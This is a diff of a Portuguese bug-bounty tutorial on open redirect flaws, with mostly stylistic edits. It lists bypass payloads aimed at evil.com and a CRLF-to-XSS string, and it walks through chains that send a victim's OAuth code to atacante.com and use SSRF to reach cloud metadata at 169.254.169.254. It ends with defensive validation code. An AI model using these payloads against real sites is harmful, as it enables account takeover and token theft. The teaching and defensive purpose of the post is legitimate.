@@ -12,29 +12,29 @@ comments: true
 
 ## "Achei um redirect, mas o triador fechou como informativo"
 
-Acontece direto: o caçador encontra que `https://alvo.com/go?url=https://google.com` joga o navegador pro Google, reporta como **Open Redirect**, e a resposta vem fria — *"baixo impacto, não aceito"* ou um bounty simbólico. Aí o iniciante conclui que open redirect "não vale a pena" e para de testar.
+Acontece direto: o caçador encontra que `https://alvo.com/go?url=https://google.com` joga o navegador pro Google, reporta como **Open Redirect**, e a resposta vem fria: *"baixo impacto, não aceito"* ou um bounty simbólico. Aí o iniciante conclui que open redirect "não vale a pena" e para de testar.
 
-Erro clássico. O open redirect é o **trampolim** mais subestimado do bug bounty. **Sozinho**, ele costuma valer pouco mesmo (faixa de R$0 num VDP — *Vulnerability Disclosure Program*, programa que aceita reports mas paga só em reconhecimento, sem dinheiro — a uns R$500 quando muito). Mas é a peça que **transforma um bug médio em crítico** quando entra numa **chain**: roubar o `code` de um fluxo OAuth, mascarar um SSRF, ou montar um phishing tão convincente que o link **realmente começa em `alvo.com`** e tem o cadeado de TLS do alvo. Neste post a gente vai do "o que é" até o uso ofensivo em chaining, com detecção, todos os bypasses de validação de domínio e a defesa que mata a classe.
+Erro clássico. O open redirect é o **trampolim** mais subestimado do bug bounty. **Sozinho**, ele costuma valer pouco mesmo (faixa de R$0 num VDP, o *Vulnerability Disclosure Program*, programa que aceita reports mas paga só em reconhecimento, sem dinheiro, a uns R$500 quando muito). Mas é a peça que **transforma um bug médio em crítico** quando entra numa **chain**: roubar o `code` de um fluxo OAuth, mascarar um SSRF, ou montar um phishing tão convincente que o link **realmente começa em `alvo.com`** e tem o cadeado de TLS do alvo. Neste post a gente vai do "o que é" até o uso ofensivo em chaining, com detecção, todos os bypasses de validação de domínio e a defesa que mata a classe.
 
-> 💡 Aparecem aqui dois termos que valem fixar: **OAuth** é o protocolo de "Login com Google/GitHub" — um provedor confiável autentica você e devolve um `code`/token pro app. **SSRF** (*Server-Side Request Forgery*) é quando você força o **servidor** do alvo a fazer requisições por você (ex.: pra um recurso interno). Ambos têm post próprio na série.
+> 💡 Aparecem aqui dois termos que valem fixar: **OAuth** é o protocolo de "Login com Google/GitHub", em que um provedor confiável autentica você e devolve um `code`/token pro app. **SSRF** (*Server-Side Request Forgery*) é quando você força o **servidor** do alvo a fazer requisições por você (ex.: pra um recurso interno). Ambos têm post próprio na série.
 
-> Open redirect é o **CWE-601** (CWE = catálogo público de tipos de fraqueza de software, mantido pela MITRE) e cai no guarda-chuva do OWASP como [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html). Não tem uma posição própria no Top 10, mas aparece como **gadget** — peça reaproveitável que, combinada com outras, vira um ataque maior — de A01 (Broken Access Control) e como vetor de phishing/token theft.
+> Open redirect é o **CWE-601** (CWE = catálogo público de tipos de fraqueza de software, mantido pela MITRE) e cai no guarda-chuva do OWASP como [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html). Não tem uma posição própria no Top 10, mas aparece como **gadget** (peça reaproveitável que, combinada com outras, vira um ataque maior) de A01 (Broken Access Control) e como vetor de phishing/token theft.
 
 ## O que é Open Redirect
 
 **Open redirect** (ou *unvalidated redirect*) é quando a aplicação **manda o navegador pra uma URL que veio do usuário**, sem validar pra onde. Você controla o destino do redirecionamento; o app obedece cegamente.
 
-> **Analogia:** imagine a recepcionista de um prédio respeitável. Alguém liga e diz *"transfere essa ligação pro ramal 4823"*. Se ela transfere sem conferir se 4823 existe **dentro do prédio** — e na verdade joga a ligação pra um número de fora —, qualquer um pode usar a recepcionista de fachada confiável pra levar a vítima até um golpista. A vítima confia porque a ligação **começou** no prédio sério. O navegador é a vítima; a recepcionista é o servidor; o "ramal de fora" é o `evil.com`.
+> **Analogia:** imagine a recepcionista de um prédio respeitável. Alguém liga e diz *"transfere essa ligação pro ramal 4823"*. Se ela transfere sem conferir se 4823 existe **dentro do prédio** (e na verdade joga a ligação pra um número de fora), qualquer um pode usar a recepcionista de fachada confiável pra levar a vítima até um golpista. A vítima confia porque a ligação **começou** no prédio sério. O navegador é a vítima; a recepcionista é o servidor; o "ramal de fora" é o `evil.com`.
 
-A definição da PortSwigger é direta: *"open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way"* ([PortSwigger KB](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)). A palavra-chave é **unsafe** — não é o redirect que é o problema, é a **falta de validação** do destino.
+A definição da PortSwigger é direta: *"open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way"* ([PortSwigger KB](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)). A palavra-chave é **unsafe**: não é o redirect que é o problema, é a **falta de validação** do destino.
 
 Existem dois sabores:
-- **Redirect baseado em header** — o servidor responde `3xx` com um `Location:` controlado por você. É o mais comum.
-- **Redirect client-side (DOM-based)** — o JavaScript da página lê um parâmetro e faz `window.location = ...` / `location.href = ...`. Aqui não tem `3xx`; quem redireciona é o browser executando o JS. (Detecção é diferente — falamos disso no recon.)
+- **Redirect baseado em header**: o servidor responde `3xx` com um `Location:` controlado por você. É o mais comum.
+- **Redirect client-side (DOM-based)**: o JavaScript da página lê um parâmetro e faz `window.location = ...` / `location.href = ...`. Aqui não tem `3xx`; quem redireciona é o browser executando o JS. (Detecção é diferente, falamos disso no recon.)
 
 ## Por que isso importa (e quanto paga)
 
-O impacto **isolado** é, sim, baixo — e é importante você entender o **porquê** pra não brigar com o triador à toa. Um redirect puro não rouba dado, não executa código, não muda estado: ele só **leva você pra outro lugar**. O risco real é **engenharia social** — o link parece do alvo, mas termina no atacante.
+O impacto **isolado** é, sim, baixo, e é importante você entender o **porquê** pra não brigar com o triador à toa. Um redirect puro não rouba dado, não executa código, não muda estado: ele só **leva você pra outro lugar**. O risco real é **engenharia social** — o link parece do alvo, mas termina no atacante.
 
 Mas o valor explode quando o redirect vira **trampolim** numa chain. Aí o impacto não é "do redirect" — é do que ele **destrava**:
 
@@ -50,16 +50,16 @@ Faixa realista: **open redirect puro** costuma pagar de **nada (VDP/informativo)
 
 ### Como isso pontua (CVSS v3.1 e v4.0)
 
-A nota técnica conta uma história parecida: **baixa/média sozinho, crítica em chain**. Repare que "vale pouco" (mercado) e "score baixo" (CVSS) não são a mesma coisa — o CVSS de um open redirect isolado costuma cair em **Médio**, não em "Baixo", porque o ataque **muda de escopo** (sai do alvo e atinge o usuário). Por isso é útil levar os dois números no report:
+A nota técnica conta uma história parecida: **baixa/média sozinho, crítica em chain**. Repare que "vale pouco" (mercado) e "score baixo" (CVSS) não são a mesma coisa. O CVSS de um open redirect isolado costuma cair em **Médio**, não em "Baixo", porque o ataque **muda de escopo** (sai do alvo e atinge o usuário). Por isso é útil levar os dois números no report:
 
 | Cenário | CVSS v3.1 | CVSS v4.0 | Leitura |
 |---|---|---|---|
 | **Open redirect isolado** | **6.1 — Médio**<br>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **~5.3 — Médio**<br>`AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N` | Exige **interação** da vítima (clicar); impacto é integridade/confiança, não dado direto. O `S:C` (escopo alterado) do v3.1 é o que segura em Médio. |
 | **Chain: open redirect → roubo de `code`/token OAuth → ATO** | **8.0–9.3 — Alto/Crítico**<br>ex.: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (9.3) | **8.3–9.3 — Alto/Crítico**<br>ex.: `…/VC:H/VI:H/VA:N/SC:H/SI:H/…` | O impacto **não é do redirect** — é da conta tomada. Aqui você pontua o **resultado da chain** (ATO), não o gadget. |
 
-> 💡 **Por que dois scores?** O **v3.1** ainda é o que a maioria dos programas usa; o **v4.0** ([FIRST, 2023](https://www.first.org/cvss/v4.0/specification-document)) trocou o `S` (Scope) por métricas separadas de impacto **no sistema** (`VC/VI/VA`) e **subsequente** (`SC/SI/SA`) — o que **descreve melhor um trampolim**, em que o dano acontece num *outro* sistema (a conta da vítima, um serviço interno). Para open redirect, a [referência da PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) classifica a severidade do issue isolado como **Low/Information**, justamente porque o impacto direto depende de engenharia social — outra razão pra **pontuar a chain**, não o gadget.
+> 💡 **Por que dois scores?** O **v3.1** ainda é o que a maioria dos programas usa; o **v4.0** ([FIRST, 2023](https://www.first.org/cvss/v4.0/specification-document)) trocou o `S` (Scope) por métricas separadas de impacto **no sistema** (`VC/VI/VA`) e **subsequente** (`SC/SI/SA`), o que **descreve melhor um trampolim**, em que o dano acontece num *outro* sistema (a conta da vítima, um serviço interno). Para open redirect, a [referência da PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) classifica a severidade do issue isolado como **Low/Information**, justamente porque o impacto direto depende de engenharia social. É outra razão pra **pontuar a chain**, não o gadget.
 
-> ⚠️ **Cheque o escopo.** Muitos programas marcam open redirect **isolado** como *out of scope* ou *informational*. Não desista: documente a **chain** ou o **impacto demonstrável** (token theft, phishing de credencial). É a chain que paga. Calibre o número com cuidado — detalhe no post [Severidade & Impacto](/posts/severidade-impacto-triagem/).
+> ⚠️ **Cheque o escopo.** Muitos programas marcam open redirect **isolado** como *out of scope* ou *informational*. Não desista: documente a **chain** ou o **impacto demonstrável** (token theft, phishing de credencial). É a chain que paga. Calibre o número com cuidado: detalhe no post [Severidade & Impacto](/posts/severidade-impacto-triagem/).
 
 ## Como funciona por trás
 
@@ -99,11 +99,11 @@ const params = new URLSearchParams(location.search);
 window.location = params.get('returnUrl');   // <- input cru vira navegação
 ```
 
-Repare: na versão DOM-based não existe `Location` na resposta do servidor. Quem executa o redirect é o JS no browser. Por isso ferramentas que só olham respostas HTTP **não pegam** esse caso — você precisa olhar o JS.
+Repare: na versão DOM-based não existe `Location` na resposta do servidor. Quem executa o redirect é o JS no browser. Por isso ferramentas que só olham respostas HTTP **não pegam** esse caso: você precisa olhar o JS.
 
 ## Onde achar — os parâmetros suspeitos
 
-Open redirect mora em parâmetros que carregam um **destino/URL de retorno**. Decore esta família — é onde você vai bater os olhos primeiro:
+Open redirect mora em parâmetros que carregam um **destino/URL de retorno**. Decore esta família, é onde você vai bater os olhos primeiro:
 
 | Nome do parâmetro | Onde aparece tipicamente |
 |---|---|
@@ -114,11 +114,11 @@ Open redirect mora em parâmetros que carregam um **destino/URL de retorno**. De
 | `redirect_uri` | **OAuth/OIDC** (o mais valioso — destrava token theft) |
 | `image_url`, `checkout_url`, `link`, `u` | trackers, e-commerce, e-mails de marketing |
 
-> 💡 **Mapa mental:** todo lugar onde o app precisa **"te levar de volta pra onde você estava"** é candidato — pós-login, pós-logout, pós-checkout, pós-OAuth. Esse "de volta" quase sempre é um parâmetro, e parâmetro que aceita URL é onde o open redirect se esconde.
+> 💡 **Mapa mental:** todo lugar onde o app precisa **"te levar de volta pra onde você estava"** é candidato: pós-login, pós-logout, pós-checkout, pós-OAuth. Esse "de volta" quase sempre é um parâmetro, e parâmetro que aceita URL é onde o open redirect se esconde.
 
 ## Recon — como encontrar
 
-A ideia é coletar **muitas URLs** do alvo e filtrar as que carregam parâmetros de redirect. As ferramentas de coleta de URL (`gau`, `katana`, `waybackurls`) já foram apresentadas no post [Recon & Discovery](/posts/recon-discovery/) — recapitulando rápido: `gau` puxa URLs do Wayback/AlienVault/etc., e `gf` é um wrapper de `grep` com padrões prontos por classe de bug.
+A ideia é coletar **muitas URLs** do alvo e filtrar as que carregam parâmetros de redirect. As ferramentas de coleta de URL (`gau`, `katana`, `waybackurls`) já foram apresentadas no post [Recon & Discovery](/posts/recon-discovery/). Recapitulando rápido: `gau` puxa URLs do Wayback/AlienVault/etc., e `gf` é um wrapper de `grep` com padrões prontos por classe de bug.
 
 ```bash
 # 1) Junta URLs históricas do alvo e filtra parâmetros de redirect
@@ -154,7 +154,7 @@ Se voltar `Location: https://example.com` (header-based) **ou** o navegador sair
 
 ## Exploração e bypasses de validação de domínio
 
-A maioria dos alvos **tenta** validar o destino. O jogo do caçador é descobrir **como** eles validam e quebrar essa lógica. Vamos do mais simples ao mais sutil — entendendo **por que** cada um funciona, que é o que te deixa replicar em qualquer alvo.
+A maioria dos alvos **tenta** validar o destino. O jogo do caçador é descobrir **como** eles validam e quebrar essa lógica. Vamos do mais simples ao mais sutil, entendendo **por que** cada um funciona, que é o que te deixa replicar em qualquer alvo.
 
 ### Nível 0 — Sem validação nenhuma
 
@@ -166,7 +166,7 @@ https://alvo.com/go?url=https://evil.com
 
 ### Nível 1 — Bypass de URL scheme-relative (`//evil.com`)
 
-Esse é o **rei dos bypasses** e o que aparece na maioria dos casos reais. Validações ingênuas checam *"a URL começa com `http://` ou `https://` de domínio externo?"* — e bloqueiam isso. Mas elas esquecem da **URL scheme-relative** (também chamada *network-path reference*, definida na [RFC 3986 §4.2](https://datatracker.ietf.org/doc/html/rfc3986#section-4.2)):
+Esse é o **rei dos bypasses** e o que aparece na maioria dos casos reais. Validações ingênuas checam *"a URL começa com `http://` ou `https://` de domínio externo?"*, e bloqueiam isso. Mas elas esquecem da **URL scheme-relative** (também chamada *network-path reference*, definida na [RFC 3986 §4.2](https://datatracker.ietf.org/doc/html/rfc3986#section-4.2)):
 
 ```
 https://alvo.com/go?url=//evil.com        # <- duas barras, SEM esquema
@@ -183,7 +183,7 @@ https://alvo.com/go?url=/%2f/evil.com      # barra encodada no meio
 https://alvo.com/go?url=%2f%2fevil.com     # // totalmente encodado
 ```
 
-**Por que funcionam:** navegadores **normalizam** `\` pra `/` (e decodificam `%2f`), mas muitos parsers de backend tratam `\` como caractere de path comum — então o servidor "acha" que é um caminho interno e libera, enquanto o browser entende como host externo. É uma **discrepância de parsing** entre quem valida (servidor) e quem executa (browser).
+**Por que funcionam:** navegadores **normalizam** `\` pra `/` (e decodificam `%2f`), mas muitos parsers de backend tratam `\` como caractere de path comum, então o servidor "acha" que é um caminho interno e libera, enquanto o browser entende como host externo. É uma **discrepância de parsing** entre quem valida (servidor) e quem executa (browser).
 
 ### Nível 2 — Bypass de esquema "colado" (`https:evil.com`)
 
@@ -204,7 +204,7 @@ Esse engana **humano e máquina**. A sintaxe de URL permite `usuario:senha@host`
 https://alvo.com/go?url=https://alvo.com@evil.com   # <- "alvo.com" é só o usuário!
 ```
 
-**Por que funciona:** pro browser, tudo **antes do `@`** é credencial (userinfo) e o **host real** é o que vem **depois** — ou seja, `evil.com`. Mas um filtro que faz *"a URL contém `alvo.com`?"* ou *"começa com `https://alvo.com`?"* vê o `alvo.com` no começo e aprova. É o bypass perfeito contra validação por `startsWith`/`contains`.
+**Por que funciona:** pro browser, tudo **antes do `@`** é credencial (userinfo) e o **host real** é o que vem **depois**, ou seja, `evil.com`. Mas um filtro que faz *"a URL contém `alvo.com`?"* ou *"começa com `https://alvo.com`?"* vê o `alvo.com` no começo e aprova. É o bypass perfeito contra validação por `startsWith`/`contains`.
 
 ### Nível 4 — Confusão de subdomínio e sufixo
 
@@ -233,29 +233,29 @@ https://alvo.com/go?url=http://evil.com%2523@alvo.com # mistura encoding + @
 
 ### Nível 6 — CRLF no parâmetro de redirect (escala pra XSS/header injection)
 
-Quando o valor do parâmetro vai **cru pro header `Location`** e o servidor **não filtra `\r\n`** (CRLF — *carriage return + line feed*, os bytes `%0d%0a` que separam um header do outro no HTTP), o "open redirect" deixa de ser só redirect: você consegue **injetar headers** e até **HTML/JS** na resposta. É a ponte entre open redirect e [CRLF Injection](/posts/crlf-request-smuggling/).
+Quando o valor do parâmetro vai **cru pro header `Location`** e o servidor **não filtra `\r\n`** (o CRLF, *carriage return + line feed*, são os bytes `%0d%0a` que separam um header do outro no HTTP), o "open redirect" deixa de ser só redirect: você consegue **injetar headers** e até **HTML/JS** na resposta. É a ponte entre open redirect e [CRLF Injection](/posts/crlf-request-smuggling/).
 
 ```
 https://alvo.com/logout?redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
 ```
 
-**Por que funciona:** o `%0d%0a%0d%0a` fecha os headers e abre o **corpo** da resposta; se o `Content-Type` for `text/html`, o navegador renderiza o que vier depois — virando **XSS refletido**. Esse foi exatamente o padrão de um caso real anonimizado: um gateway corporativo refletia o parâmetro `post_logout_redirect_uri` do endpoint de logout sem sanitizar CRLF, e um payload com `%0D%0A%0D%0A<body onload=...>` executava JS no domínio do alvo (o [CVE-2023-24488](https://nvd.nist.gov/vuln/detail/CVE-2023-24488) é classificado como XSS/CWE-79, não open redirect). Aqui a severidade **sobe sozinha**, sem precisar de outra falha: XSS no domínio do alvo já é Alto.
+**Por que funciona:** o `%0d%0a%0d%0a` fecha os headers e abre o **corpo** da resposta; se o `Content-Type` for `text/html`, o navegador renderiza o que vier depois, virando **XSS refletido**. Esse foi exatamente o padrão de um caso real anonimizado: um gateway corporativo refletia o parâmetro `post_logout_redirect_uri` do endpoint de logout sem sanitizar CRLF, e um payload com `%0D%0A%0D%0A<body onload=...>` executava JS no domínio do alvo (o [CVE-2023-24488](https://nvd.nist.gov/vuln/detail/CVE-2023-24488) é classificado como XSS/CWE-79, não open redirect). Aqui a severidade **sobe sozinha**, sem precisar de outra falha: XSS no domínio do alvo já é Alto.
 
-> 💡 Antes de cravar "só open redirect", sempre teste **um `%0d%0a` no parâmetro**. Se a quebra de linha passa pro `Location`, você pode ter CRLF/XSS no colo — um achado bem mais valioso. A mecânica completa está em [CRLF Injection e HTTP Request Smuggling](/posts/crlf-request-smuggling/).
+> 💡 Antes de cravar "só open redirect", sempre teste **um `%0d%0a` no parâmetro**. Se a quebra de linha passa pro `Location`, você pode ter CRLF/XSS no colo, um achado bem mais valioso. A mecânica completa está em [CRLF Injection e HTTP Request Smuggling](/posts/crlf-request-smuggling/).
 
-> 💡 **Dica de ouro do bypass:** o open redirect quase sempre é uma **discrepância de parsing** — o validador e o executor (browser) entendem a mesma string de formas diferentes. Sua arma é uma boa **wordlist** rodada no parâmetro. A página [Open Redirect do PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md) reúne os payloads de bypass prontos (e linka a wordlist [Open-Redirect-Payloads do Cujanović](https://github.com/cujanovic/Open-Redirect-Payloads)) — jogue no **Burp Intruder** (posição no parâmetro) e veja qual variação escapa.
+> 💡 **Dica de ouro do bypass:** o open redirect quase sempre é uma **discrepância de parsing**: o validador e o executor (browser) entendem a mesma string de formas diferentes. Sua arma é uma boa **wordlist** rodada no parâmetro. A página [Open Redirect do PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md) reúne os payloads de bypass prontos (e linka a wordlist [Open-Redirect-Payloads do Cujanović](https://github.com/cujanovic/Open-Redirect-Payloads)). Jogue no **Burp Intruder** (posição no parâmetro) e veja qual variação escapa.
 
 ## Onde o trampolim vira crítico: chaining
 
-Aqui é o coração do post. **Sozinho** o redirect é fraco; em chain ele destrava o ouro. Open redirect é um dos **gadgets** mais reutilizados em chains — se a ideia de "somar bugs pequenos num crítico" ainda é nova pra você, o post [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) trata disso a fundo; aqui mostramos os três encaixes mais rentáveis.
+Aqui é o coração do post. **Sozinho** o redirect é fraco; em chain ele destrava o ouro. Open redirect é um dos **gadgets** mais reutilizados em chains. Se a ideia de "somar bugs pequenos num crítico" ainda é nova pra você, o post [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) trata disso a fundo; aqui mostramos os três encaixes mais rentáveis.
 
 ### Chain 1 — Roubo de `code` OAuth → Account Takeover
 
 Esse é o uso de maior impacto. Recapitulando o fluxo OAuth *authorization code* (que detalhamos no post [Account Takeover](/posts/account-takeover/)): o app redireciona você pro provedor (Google/GitHub) com `client_id`, `redirect_uri`, `response_type=code`, `scope` e `state`. O provedor autentica e devolve um **`code`** pro `redirect_uri`. Quem tiver o `code` troca por um token e **loga como você**.
 
-Os provedores sérios validam o `redirect_uri` contra uma allowlist exata — você **não consegue** apontar direto pra `evil.com`. **Mas** a PortSwigger aponta o caminho: se você achar um **open redirect dentro do próprio domínio whitelisted**, o `redirect_uri` continua sendo `alvo.com` (válido!), o provedor entrega o `code` pra `alvo.com`, e o **open redirect repassa esse `code` pra você**. Como diz a [PortSwigger sobre OAuth](https://portswigger.net/web-security/oauth), um open redirect no cliente legítimo vira *"a proxy to forward victims, along with their code or token, to an attacker-controlled domain"*.
+Os provedores sérios validam o `redirect_uri` contra uma allowlist exata. Você **não consegue** apontar direto pra `evil.com`. **Mas** a PortSwigger aponta o caminho: se você achar um **open redirect dentro do próprio domínio whitelisted**, o `redirect_uri` continua sendo `alvo.com` (válido!), o provedor entrega o `code` pra `alvo.com`, e o **open redirect repassa esse `code` pra você**. Como diz a [PortSwigger sobre OAuth](https://portswigger.net/web-security/oauth), um open redirect no cliente legítimo vira *"a proxy to forward victims, along with their code or token, to an attacker-controlled domain"*.
 
-> 💡 **Detalhe que destrava o lab clássico:** mesmo quando a allowlist do provedor é estrita, ela muitas vezes só checa se o `redirect_uri` **começa com** o valor cadastrado — e deixa você **anexar** caracteres no fim, incluindo `/../`. No [lab oficial da PortSwigger](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), o truque é `redirect_uri=https://alvo.com/oauth-callback/../post/next?path=//evil.com` — o `/../` "sobe" do callback e cai no open redirect do blog. É o **Nível 4** (validação por `startsWith`) reaparecendo, agora dentro do OAuth.
+> 💡 **Detalhe que destrava o lab clássico:** mesmo quando a allowlist do provedor é estrita, ela muitas vezes só checa se o `redirect_uri` **começa com** o valor cadastrado, e deixa você **anexar** caracteres no fim, incluindo `/../`. No [lab oficial da PortSwigger](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), o truque é `redirect_uri=https://alvo.com/oauth-callback/../post/next?path=//evil.com`, em que o `/../` "sobe" do callback e cai no open redirect do blog. É o **Nível 4** (validação por `startsWith`) reaparecendo, agora dentro do OAuth.
 
 Na prática, o `redirect_uri` aponta pra um endpoint de redirect interno do alvo:
 
@@ -269,7 +269,7 @@ Host: accounts.provedor.com
 ```
 
 Fluxo do ataque:
-1. A vítima clica no link (parece 100% legítimo — começa no provedor real e usa o `alvo.com` real).
+1. A vítima clica no link (parece 100% legítimo, começa no provedor real e usa o `alvo.com` real).
 2. O provedor autentica e redireciona pra `https://alvo.com/login/callback?next=//evil.com&code=AUTH_CODE`.
 3. O endpoint `/login/callback` do alvo, vulnerável, segue o `next` e redireciona pra `//evil.com` **carregando o `code` junto** (no query ou via `Referer`).
 4. O atacante captura o `code` em `evil.com` e troca por um token → **ATO**.
@@ -277,7 +277,7 @@ Fluxo do ataque:
 > 💡 **fragment**: a parte da URL após o # (ex.: #access_token=abc). O navegador a lê, mas ela NÃO é enviada ao servidor.
 {: .prompt-tip }
 
-Variante ainda mais direta com o **implicit grant** (`response_type=token`): aí o **access token** vem na **fragment** (`#access_token=...`) da URL de callback. Como a PortSwigger nota, *"the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment"* — e fragment é lido por JS no browser, então um open redirect client-side no callback vaza o token direto. O detalhe que faz a chain fechar: **o navegador reanexa a fragment ao seguir um redirect**, então quando o open redirect leva pra `evil.com`, o `#access_token=...` vai junto; em `evil.com` um `document.location.hash` captura o token e reenvia pro atacante (é assim que o lab da PortSwigger exfiltra).
+Variante ainda mais direta com o **implicit grant** (`response_type=token`): aí o **access token** vem na **fragment** (`#access_token=...`) da URL de callback. Como a PortSwigger nota, *"the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment"*. E fragment é lido por JS no browser, então um open redirect client-side no callback vaza o token direto. O detalhe que faz a chain fechar: **o navegador reanexa a fragment ao seguir um redirect**, então quando o open redirect leva pra `evil.com`, o `#access_token=...` vai junto; em `evil.com` um `document.location.hash` captura o token e reenvia pro atacante (é assim que o lab da PortSwigger exfiltra).
 
 ### Chain 2 — Mascarar/destravar SSRF
 
@@ -292,7 +292,7 @@ Content-Type: application/json
 # <- passa a allowlist (é alvo.com), mas o redirect leva o fetcher pro metadata interno
 ```
 
-**Por que funciona:** o validador de SSRF aprova `alvo.com`; o cliente HTTP do servidor então **segue o redirect** (se `follow redirects` estiver ligado) e acaba batendo no recurso interno (ex.: o endpoint de metadados `169.254.169.254` da nuvem). Esse é um dos bypasses clássicos de allowlist de SSRF — a mecânica completa (e por que tantos fetchers seguem redirect cegamente) está no post [SSRF](/posts/ssrf/). Aqui o ponto é só: open redirect **fura allowlist de saída**.
+**Por que funciona:** o validador de SSRF aprova `alvo.com`; o cliente HTTP do servidor então **segue o redirect** (se `follow redirects` estiver ligado) e acaba batendo no recurso interno (ex.: o endpoint de metadados `169.254.169.254` da nuvem). Esse é um dos bypasses clássicos de allowlist de SSRF. A mecânica completa (e por que tantos fetchers seguem redirect cegamente) está no post [SSRF](/posts/ssrf/). Aqui o ponto é só: open redirect **fura allowlist de saída**.
 
 ### Chain 3 — Phishing de alta credibilidade
 
@@ -304,7 +304,7 @@ O mais "simples", mas eficaz. O link de phishing **começa em `alvo.com`**, com 
 
 Você testa `app.exemplo.com`, que oferece "Login com Provedor". Durante o login pós-OAuth, o Burp registra um callback interno:
 
-**Passo 1 — Achar o redirect interno.** No histórico do Burp, o endpoint de callback tem um parâmetro `continue`:
+**Passo 1, achar o redirect interno.** No histórico do Burp, o endpoint de callback tem um parâmetro `continue`:
 
 ```http
 GET /sso/callback?continue=/dashboard HTTP/2
@@ -325,7 +325,7 @@ Location: //example.com           # <- redirect aberto confirmado (vira https://
 
 Open redirect confirmado no `continue`. **Isolado**, seria baixo. Mas o `continue` está **no endpoint de callback do OAuth**.
 
-**Passo 2 — Confirmar que o `redirect_uri` aceita esse callback.** O início do fluxo OAuth aponta o `redirect_uri` pro próprio callback do app (válido na allowlist do provedor):
+**Passo 2, confirmar que o `redirect_uri` aceita esse callback.** O início do fluxo OAuth aponta o `redirect_uri` pro próprio callback do app (válido na allowlist do provedor):
 
 ```http
 GET /authorize?client_id=app_exemplo
@@ -335,9 +335,9 @@ GET /authorize?client_id=app_exemplo
 Host: accounts.provedor.com
 ```
 
-O provedor valida o `redirect_uri` — e ele **é** `app.exemplo.com`, então passa.
+O provedor valida o `redirect_uri`, e ele **é** `app.exemplo.com`, então passa.
 
-**Passo 3 — A chain.** Você manda esse link pra vítima (parece legítimo). Ela autentica no provedor real; o provedor redireciona pra `https://app.exemplo.com/sso/callback?continue=//atacante.com&code=AUTH_CODE`; o callback vulnerável segue o `continue` e joga o navegador pra `//atacante.com` **com o `code` anexado/no `Referer`**. Em `atacante.com`, você captura o `code` e troca por token.
+**Passo 3, a chain.** Você manda esse link pra vítima (parece legítimo). Ela autentica no provedor real; o provedor redireciona pra `https://app.exemplo.com/sso/callback?continue=//atacante.com&code=AUTH_CODE`; o callback vulnerável segue o `continue` e joga o navegador pra `//atacante.com` **com o `code` anexado/no `Referer`**. Em `atacante.com`, você captura o `code` e troca por token.
 
 ```http
 GET /?code=AUTH_CODE_DA_VITIMA HTTP/2     # <- chega no servidor do atacante
@@ -346,13 +346,13 @@ Host: atacante.com
 
 **O que a tela do Burp mostraria:** painel Request/Response com o `302 Location: //example.com` destacado em vermelho no PoC do redirect; e, na demonstração da chain, a request final chegando no Collaborator/servidor do atacante carregando o parâmetro `code` da vítima.
 
-**Passo 4 — Report.** Título: `[Open Redirect → OAuth Code Theft] ATO via continue= no /sso/callback`. Severidade **Crítica** (account takeover de qualquer usuário que clicar). No resumo, deixe explícito que o open redirect é o **gadget** e o impacto é **roubo de token + ATO** — é isso que tira o report do balde "informativo". (Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) e a calibração de severidade em [Severidade & Impacto](/posts/severidade-impacto-triagem/).)
+**Passo 4, o report.** Título: `[Open Redirect → OAuth Code Theft] ATO via continue= no /sso/callback`. Severidade **Crítica** (account takeover de qualquer usuário que clicar). No resumo, deixe explícito que o open redirect é o **gadget** e o impacto é **roubo de token + ATO**: é isso que tira o report do balde "informativo". (Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) e a calibração de severidade em [Severidade & Impacto](/posts/severidade-impacto-triagem/).)
 
 ## Defesa em camadas
 
-A regra-mãe: **nunca reflita input cru no destino do redirect.** A OWASP é categórica — *"if used, do not allow the URL as user input for the destination"*. Em ordem de preferência:
+A regra-mãe: **nunca reflita input cru no destino do redirect.** A OWASP é categórica: *"if used, do not allow the URL as user input for the destination"*. Em ordem de preferência:
 
-**1. O ideal — não aceite URL nenhuma. Use um índice/ID mapeado no servidor:**
+**1. O ideal: não aceite URL nenhuma. Use um índice/ID mapeado no servidor:**
 
 ```php
 // CORRETO — o cliente manda uma CHAVE, não uma URL. Zero superfície de bypass.
@@ -369,7 +369,7 @@ exit;
 
 Essa é a recomendação tanto da OWASP (*"server-side mapping"*) quanto da PortSwigger (*"pass an index into this list"*). Sem URL crua, não tem o que bypassar.
 
-**2. Se PRECISA aceitar destino — force caminho relativo (mesma origem):**
+**2. Se PRECISA aceitar destino, force caminho relativo (mesma origem):**
 
 ```javascript
 // Node — só permite redirect DENTRO do próprio site
@@ -386,7 +386,7 @@ function safeRedirect(res, input) {
 
 O regex `^\/[^/\\]` exige: começa com `/` **e** o segundo caractere **não** é `/` nem `\`. Isso mata `//evil.com`, `/\evil.com` e `\/...` de uma vez.
 
-**3. Se PRECISA de destino absoluto/externo — allowlist com parser de URL real (nunca string):**
+**3. Se PRECISA de destino absoluto/externo, allowlist com parser de URL real (nunca string):**
 
 ```python
 from urllib.parse import urlparse
